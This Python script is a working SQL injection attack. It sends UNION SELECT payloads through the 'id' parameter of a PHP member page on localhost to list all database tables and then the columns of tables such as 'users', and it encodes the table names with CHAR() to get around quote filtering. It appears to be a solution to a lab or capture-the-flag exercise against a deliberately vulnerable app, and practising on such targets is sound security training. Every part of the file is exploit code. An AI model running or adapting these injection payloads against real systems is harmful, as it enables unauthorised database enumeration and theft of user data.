from requests import get
import re

def main():
    # ALL TABLES
    id = "0 UNION SELECT table_name, null FROM information_schema.tables"
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    tableNames = re.findall(r"First name:\s*([^\n<]+)", response.text)

#    for name in tableNames:
#        print(name)
    
    # users COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(117,115,101,114,115)" # users
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    usersTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

#    for name in usersTableColumns:
#        print(name)
    
    # db_default COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(100,98,95,100,101,102,97,117,108,116)" # db_default
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    db_defaultTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

#    for name in db_defaultTableColumns:
#        print(name)
    
    # guestbook COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(103,117,101,115,116,98,111,111,107)" # guestbook
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    guestbookTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

#    for name in guestbookTableColumns:
#        print(name)
    
    # list_images COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(108,105,115,116,95,105,109,97,103,101,115)" # list_images
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    list_imagesTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

#    for name in list_imagesTableColumns:
#        print(name)
    
    # vote_dbs COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(118,111,116,101,95,100,98,115)" # vote_dbs
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    vote_dbsTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

#    for name in vote_dbsTableColumns:
#        print(name)

if __name__ == "__main__":
	main()